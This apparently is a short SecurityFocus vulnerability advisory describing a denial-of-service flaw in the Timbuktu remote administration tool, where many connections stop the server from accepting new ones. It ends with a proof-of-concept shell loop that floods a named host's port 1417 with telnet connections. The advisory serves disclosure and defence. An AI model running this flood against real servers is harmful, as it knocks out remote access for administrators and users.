source: http://www.securityfocus.com/bid/3918/info

Timbuktu is a remote administration tool. It is available for the Microsoft Window's family of operating systems and Power PC based Macintosh computers. It supports a variety of administrative tasks, including full remote access to the user's desktop.

A vulnerability exists in some versions of Timbuktu. If a large number of connections are created to the Timbuktu server, the server will no longer accept new connections. 

#!/bin/sh
while:
do
telnet tb2.host.com 1417 &
done